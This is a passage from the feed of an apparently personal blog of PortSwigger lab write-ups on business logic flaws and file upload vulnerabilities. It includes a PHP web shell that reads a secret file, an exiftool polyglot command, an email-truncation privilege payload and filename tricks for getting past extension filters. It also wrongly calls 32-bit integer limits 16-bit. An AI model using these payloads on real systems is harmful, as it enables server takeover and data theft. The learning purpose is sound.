+    &lt;a href=&#34;#flawed-enforcement-of-business-rules&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;In this case, the application has made two coupons available: &lt;code&gt;NEWCUST5&lt;/code&gt; and &lt;code&gt;SIGNUP30&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;It does check if the coupon that the user is trying to apply is already applied, but fails to do it if the user alternates between the two coupons. The reason for this behavior is that the application is probably checking for the last applied coupon, instead of running through the set of applied ones and verifying if the one being attempted is already there, which would be more appropriate.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-6.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-7.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;Low-level logic flaw&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;low-level-logic-flaw&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#low-level-logic-flaw&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;By the time I did this lab, the only thing I&amp;rsquo;d wrote about it was &amp;ldquo;integer overflow&amp;rdquo;, followed by the screenshot below.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-8.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;As I don&amp;rsquo;t want to just drop it here without explanation, I&amp;rsquo;ll attempt to summarize the concept.&lt;/p&gt;
+&lt;p&gt;Basically, some programming languages have a limit for the value that a signed integer variable can store. This is due to the fact that the maximum size of that integer variable is defined by a certain amount of bytes.&lt;/p&gt;
+&lt;p&gt;In this case, from what I&amp;rsquo;ve seen in the lab&amp;rsquo;s solution, that limit would be of either &lt;code&gt;2,147,483,647&lt;/code&gt; or &lt;code&gt;-2,147,483,648&lt;/code&gt;. These are the maximum and minimum possible values for a 16 bit signed integer. If the type was of an unsigned integer, it would be able to hold up until &lt;code&gt;4,294,967,295&lt;/code&gt;, but no negative values.&lt;/p&gt;
+&lt;p&gt;In this lab, the idea was that when you reached a certain amount of products of a specific value, the total value of the cart would reach the mentioned limit of &lt;code&gt;2,147,483,647&lt;/code&gt;, and after reaching it (or getting close to it), the next product added to the cart would cause an overflow, making the cart&amp;rsquo;s total value loop back to &lt;code&gt;-2,147,483,648&lt;/code&gt;. Then, it would be necessary to keep adding products until that value reached a little more than zero, so we could buy everything basically for free.&lt;/p&gt;
+&lt;p&gt;What I believe that happened to me while doing this lab is that I got tired of trying to use that concept in my favor, to a point where I just kept intruder running and adding products until the cart&amp;rsquo;s value got close to zero, and then added a few more products manually to make it get to the value that I wanted.&lt;/p&gt;
+&lt;p&gt;I regret not writing the most accurate solution here, but I would advise the reader to go check the original solution, or even exploring this concept further. It is really interesting, and before that lab I thought it would only be applied in binary exploitation situations for desktop programs in low-level languages.&lt;/p&gt;
+&lt;p&gt;Here&amp;rsquo;s &lt;a href=&#34;https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-low-level&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;the link to the lab&lt;/a&gt;, and here&amp;rsquo;s a &lt;a href=&#34;https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-low-level&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;WikiPedia page&lt;/a&gt; that I found to be a very interesting reading.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;Inconsistent handling of user input&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;inconsistent-handling-of-user-input&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#inconsistent-handling-of-user-input&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;In this one, the application also gives higher privileges to users under the e-mail &lt;code&gt;@dontwannacry.com&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;However, it strips the user&amp;rsquo;s e-mail to 255 characters after signing up&lt;/p&gt;
+&lt;p&gt;It strips the user’s e-mail to 255 characters after registering though, which allows the attacker who can create subdomains in their e-mail client to craft such payload:&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+  
+
+&lt;pre&gt;&lt;code&gt;username=banana&amp;amp;email=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaa%40dontwannacry.com.exploit-0a3300950473acc2813a062c01030059.exploit-server.net&amp;amp;password=banana&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+
+  
+&lt;/div&gt;
+&lt;p&gt;The e-mail’s length reaches 255 characters before the actual e-mail domain starts, so after checking for the user’s e-mail, it will grant the high privileges to the user.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-9.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;This behavior could occur on implementations using old databases or programming languages that had the first byte of a string value being the representation of the number of characters in that string. Therefore, as the highest integer that can be represented in a single byte is 256, a 256-byte-long string would only contain 255 characters in it’s value, because the first byte would be &lt;code&gt;11111111&lt;/code&gt;, indicating a string with the maximum length.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;Weak isolation on dual-use endpoint&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;weak-isolation-on-dual-use-endpoint&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#weak-isolation-on-dual-use-endpoint&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;On this example, the application performs a POST request in order to change a given user’s password.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-10.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Although it the application checks for the current password, this parameter isn’t actually required, so we can just repeat the request without it, changing the password of an arbitrary user.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-11.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-12.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;Insufficient workflow validation&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;insufficient-workflow-validation&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#insufficient-workflow-validation&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;On this lab, we can simply add the desired item to our cart and then hit the order confirmation endpoint, which doesn’t perform any validation about our balance, allowing us to purchase any items we want.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-13.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-14.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;Authentication bypass via flawed state machine&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;authentication-bypass-via-flawed-state-machine&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#authentication-bypass-via-flawed-state-machine&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;After sending the login credentials, the application redirects us to &lt;code&gt;/role-selector&lt;/code&gt; upon success.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-15.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;If we use intercept to go through the login steps, we are able to drop the &lt;code&gt;GET /role-selector&lt;/code&gt; request, making so it’s never sent.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-16.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;This way, when we go back to the application, we have received the default role, which is admin.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-17.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;Infinite money logic flaw&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;infinite-money-logic-flaw&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#infinite-money-logic-flaw&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;In this case, the application gives us a coupon that gives us 30% OFF over anything we buy if we sign up to the store’s newsletter. However, we can also buy a 10$ gift card. This is a logic flaw, as a malicious user could repeatedly buy a lot of gift cards and submit the coupon on checkout, thus generating infinite money.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-18.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-19.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>File Upload</title>
+      <link>http://localhost:1313/book/portswigger/file-upload/</link>
+      <pubDate>Mon, 19 Aug 2024 11:37:34 -0300</pubDate>
+      
+      <guid>http://localhost:1313/book/portswigger/file-upload/</guid>
+      <description>
+        
+        
+        &lt;p&gt;File upload vulnerabilities arise when a website allows users to upload files to the server without properly validating it&amp;rsquo;s content.&lt;/p&gt;
+&lt;h2&gt;Exploiting&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;exploiting&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#exploiting&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h4&gt;Lab: Remote code execution via web shell upload&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;lab-remote-code-execution-via-web-shell-upload&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#lab-remote-code-execution-via-web-shell-upload&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;On the example below, the web application doesn’t have any restrictions for files uploaded as user profile pictures. This makes us able to send a PHP file, containing &lt;code&gt;&amp;lt;?php echo file_get_contents(&#39;/home/carlos/secret&#39;); ?&amp;gt;&lt;/code&gt;, which returns the content of the secret file stored in the server when we make a request to the uploaded file.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-1.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;Bypassing MIME type filter&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;bypassing-mime-type-filter&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#bypassing-mime-type-filter&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;h4&gt;Lab: Web shell upload via Content-Type restriction bypass&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;lab-web-shell-upload-via-content-type-restriction-bypass&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#lab-web-shell-upload-via-content-type-restriction-bypass&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Some applications may try to check if the MIME type of the file being sent is the expected by looking at the value of the &lt;code&gt;Content-Type&lt;/code&gt; header on the request. The problem with that is that users can easily change the value of that header to the one that the server is expecting to receive.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-2.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-3.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-4.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;Bypassing unavailable execution on uploads directory&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;bypassing-unavailable-execution-on-uploads-directory&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#bypassing-unavailable-execution-on-uploads-directory&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;h4&gt;Lab: Web shell upload via path traversal&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;lab-web-shell-upload-via-path-traversal&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#lab-web-shell-upload-via-path-traversal&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Some applications may try to prevent RCE by file upload by configuring the web server to not execute files located in the directory where the users uploads their files. However, if the website also contains a path traversal vulnerability in the upload request, an attacker could try to upload the image to a higher directory within the hierarchy and then execute it.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-5.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-6.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;URL-encoded traversal sequence, file uploaded to /files/shell.php
+Executed the code&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;Insufficient Blacklisting&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;insufficient-blacklisting&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#insufficient-blacklisting&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Blacklisting is a tricky practice for defensive mechanisms, as it is difficult for the developer to predict every single dangerous file extension. Some less known file extensions, but yet malicious, can be used in order to bypass blacklisting.&lt;/p&gt;
+&lt;h3&gt;Bypassing blacklisting by uploading .htaccess file&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;bypassing-blacklisting-by-uploading-htaccess-file&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#bypassing-blacklisting-by-uploading-htaccess-file&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;In some cases, the application fails to prevent users from uploading a configuration file. In the Apache server, there is a method for setting directory-specific configuration, which is through the &lt;code&gt;.htaccess&lt;/code&gt; file. By manipulating this file, we can map a custom arbitrary file extension to the file type that we are trying to execute.&lt;/p&gt;
+&lt;h4&gt;Lab: Web shell upload via extension blacklist bypass&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;lab-web-shell-upload-via-extension-blacklist-bypass&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#lab-web-shell-upload-via-extension-blacklist-bypass&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;In the example below, we are able to upload a &lt;code&gt;.htaccess&lt;/code&gt; file in order to set this kind of configuration.&lt;/p&gt;
+&lt;p&gt;What we are doing is basically telling Apache that every file with the &lt;code&gt;l337&lt;/code&gt; extension must be treated as a php file.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-7.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-8.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;Bypassing blacklisting with filename obfuscation&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;bypassing-blacklisting-with-filename-obfuscation&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#bypassing-blacklisting-with-filename-obfuscation&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Another method that could be used to bypass the extension blacklisting would be to include certain characters in the filename to trick the server into trusting the file sent as the expected one.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Some useful techniques are:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Multiple extensions: by providing something like &lt;code&gt;filename.php.jpg&lt;/code&gt; the server could interpret the file as either an image or a PHP file.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Adding trailing characters: some mechanisms might stripe trailing characters, such as dots, whitespaces and slashes after going through the filter, which would allow the file to still be executed, Example: &lt;code&gt;filename.php.&lt;/code&gt;. This payload could still be executed if the mechanism for checking extensions considers &lt;code&gt;hp.&lt;/code&gt; as the file extension, in the case it checks only the last three characters.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Adding uppercase characters: if the server’s filter is case-sensitive, but the part of it that maps file extensions isn’t, you could also try providing a filename like &lt;code&gt;filename.pHp&lt;/code&gt;.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;URL encoding: URL encoding (or double URL encoding) the dots could also be useful. Example: &lt;code&gt;filename%2Ephp&lt;/code&gt;.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Nested extension: if the website strips the &lt;code&gt;.php&lt;/code&gt; extension non-recursively, it could be possible to enter &lt;code&gt;filename.p.phphp&lt;/code&gt;. It would strip the inner extension, but the outer one would stay and work normally.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Copied from PortSwigger:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. Sequences like &lt;code&gt;xC0 x2E&lt;/code&gt;, &lt;code&gt;xC4 xAE&lt;/code&gt; or &lt;code&gt;xC0 xAE&lt;/code&gt; may be translated to &lt;code&gt;x2E&lt;/code&gt; if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Ending the filename: you could try tricking the server into ignoring the rest of the filename by using a semicolon or a URL encoded null byte (&lt;code&gt;%00&lt;/code&gt;). The full filename would be parsed to the filter, but the last part would be striped afterwords.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;Lab: Web shell upload via obfuscated file extension&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;lab-web-shell-upload-via-obfuscated-file-extension&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#lab-web-shell-upload-via-obfuscated-file-extension&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Null byte technique&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-9.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;Bypassing content checking&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;bypassing-content-checking&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#bypassing-content-checking&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;A more effective way of preventing against malicious files is to try checking a file’s content for attributes inherent to images. In this case, an attacker could still try to insert malicious code within an image’s metadata using a tool such as ExifTool.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+  
+
+&lt;pre&gt;&lt;code&gt;exiftool -Comment=&amp;#34;&amp;lt;?php echo &amp;#39;START &amp;#39; .file_get_contents(&amp;#39;/home/carlos/secret&amp;#39;) . &amp;#39; END&amp;#39;; ?&amp;gt;&amp;#34; &amp;lt;YOUR-INPUT-IMAGE&amp;gt;.jpg -o polyglot.php
+# START and END will be useful in order to facilitate the content&amp;#39;s visualization.
+# The image will be saved as &amp;#34;polyglot.php&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+
+  
+&lt;/div&gt;
+&lt;p&gt;The command above edits an image and inserts a PHP code as the “Comment” value of the image&amp;rsquo;s metadata. When we access the file, that part of it will be replaced with the contents of the file fetched in the PHP code.&lt;/p&gt;
+&lt;h4&gt;Lab: Remote code execution via polyglot web shell upload&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;lab-remote-code-execution-via-polyglot-web-shell-upload&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#lab-remote-code-execution-via-polyglot-web-shell-upload&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;image-10.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-11.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;Bypassing checks via race condition&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;bypassing-checks-via-race-condition&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#bypassing-checks-via-race-condition&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;h4&gt;Lab: Web shell upload via race condition&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;lab-web-shell-upload-via-race-condition&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#lab-web-shell-upload-via-race-condition&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;On this lab, there are many restrictions on file upload, but we can bypass them by sending the request that uploads the file and the one that accesses it at the same time.&lt;/p&gt;
+&lt;p&gt;As we can see in the lab’s hint, the PHP script responsible for the file upload function moves the file to the uploads directory before actually validating it’s content.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+  
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$target_dir &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;avatars/&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$target_file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $target_dir &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $_FILES[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;avatar&amp;#34;&lt;/span&gt;][&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// temporary move
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;move_uploaded_file&lt;/span&gt;($_FILES[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;avatar&amp;#34;&lt;/span&gt;][&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tmp_name&amp;#34;&lt;/span&gt;], $target_file);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;checkViruses&lt;/span&gt;($target_file) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;checkFileType&lt;/span&gt;($target_file)) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;The file &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;htmlspecialchars&lt;/span&gt;( $target_file)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; has been uploaded.&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;} &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;unlink&lt;/span&gt;($target_file);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Sorry, there was an error uploading your file.&amp;#34;&lt;/span&gt;;
